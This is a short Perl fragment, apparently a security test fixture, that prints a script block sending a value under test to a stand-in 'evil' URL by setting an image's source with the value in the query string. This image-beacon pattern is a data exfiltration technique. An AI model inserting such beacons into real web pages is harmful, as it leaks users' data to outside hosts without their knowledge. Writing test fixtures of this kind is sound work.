print qq|
    <script type="text/javascript">
		var test = $dut;
		var url = "$imgevilurl?testval=" + test;
		document.images[0].src = url;
    </script>
|;

1;